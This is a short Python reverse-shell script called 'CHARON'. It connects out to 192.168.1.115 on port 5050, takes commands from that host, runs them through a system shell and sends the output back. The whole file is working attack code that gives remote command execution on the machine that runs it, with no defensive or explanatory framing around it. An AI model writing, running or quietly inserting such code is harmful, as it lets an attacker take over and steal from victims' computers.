# CHARON :
# socket program for create simple tcp revese shell on port 5050 for client

from socket import *
import subprocess

s = socket(AF_INET, SOCK_STREAM)

s.connect(("192.168.1.115",5050))

while True:

    data = s.recv(1024)
    shelltask = data.decode('utf-8')
    cmd = subprocess.check_output(shelltask,shell=True)
    s.sendall(cmd)

s.close()